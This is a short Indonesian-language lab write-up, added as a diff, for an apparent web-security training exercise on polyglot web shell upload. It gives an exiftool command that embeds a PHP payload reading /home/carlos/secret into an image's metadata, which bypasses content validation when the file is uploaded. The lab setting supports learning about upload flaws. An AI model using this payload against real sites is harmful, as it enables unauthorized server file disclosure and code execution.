@@ -1,0 +1,20 @@
+LAB 6 polyglot web shell upload
+
+Brief:
+	kerentanan upload meskipun web mencoba untuk menvalidasi konten filenya tapi ini masih bisa di bypass
+
+Tujuan:
+	dapatkan /home/carlos/secret
+	
+Analisa:
+	1. upload gambar dapatkan request GET filename
+	
+	2. upload php dan web sukses memblokir filenya meskipun dicoba dengan teknik sebelumnya
+	
+	3. buat file polygot dari exiftoo dengan:
+		
+		exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+		
+	4. upload file itu dan bisa
+	
+	5. sekarang cari di response GET "START" lalu berhasil.
